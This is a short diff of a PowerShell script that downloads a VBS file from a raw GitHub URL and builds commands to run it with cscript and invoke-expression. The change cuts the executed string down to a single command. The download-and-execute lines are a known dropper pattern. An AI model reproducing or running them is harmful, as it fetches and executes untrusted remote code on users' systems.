@@ -35,5 +35,5 @@ $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
 $b.DownloadFile($url, $my_path_m) ;
 $command4 = "cmd /C cscript "+$my_path_m
 #invoke-expression $command
-$comm=$command1 +";"+$command2 +";"+$command3+";"+$command4
+$comm=$command1
 invoke-expression $comm
